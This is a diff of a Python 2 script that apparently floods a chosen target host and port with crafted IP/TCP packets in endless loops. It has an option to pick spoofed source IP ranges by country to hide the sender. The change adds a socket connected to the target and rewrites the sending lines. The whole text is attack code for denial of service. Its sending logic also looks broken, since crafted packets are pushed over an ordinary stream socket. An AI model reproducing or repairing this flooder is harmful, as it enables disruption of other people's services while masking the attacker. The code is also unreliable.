@@ -19,8 +19,8 @@ destination = definetarget()
 targetport = defineporttarget()
 awnser_anonymizing = anonymizing_input(supcountries)
 cnt = 0
-
-
+silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+silva.connect((destination, targetport))
 
 if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
    useriprange = chooseiprange(awnser_anonymizing, supcountries)
@@ -32,8 +32,7 @@ if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
          Ip_packet = setpacketinfoip(Ip_range,destination)
-         packet = Ip_packet/Tcp_packet
-         s.send(packet)
+         silva.send(bytes(Ip_packet/Tcp_packet))
          cnt = cnt + 1
 
 if awnser_anonymizing == yourIP:
@@ -45,8 +44,7 @@ if awnser_anonymizing == yourIP:
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
          Ip_packet = setpacketinfoip(Ip_range,destination)
-         packet = Ip_packet/Tcp_packet
-         s.send(packet)
+         silva.send(bytes((Ip_packet/Tcp_packet)))
          cnt = cnt + 1
          print str(cnt) + ' packeges send'
         
@@ -61,8 +59,7 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     while 0 == 0:
          Ip_packet = setpacketinfoip(Ip_range,destination)
          Tcp_packet = setpacketinfotcp(targetport)
-         packet = Ip_packet/Tcp_packet
-         s.send(packet)
+         silva.send(bytes(Ip_packet/Tcp_packet))
          cnt = cnt + 1
          print str(cnt) + ' packeges send'
 
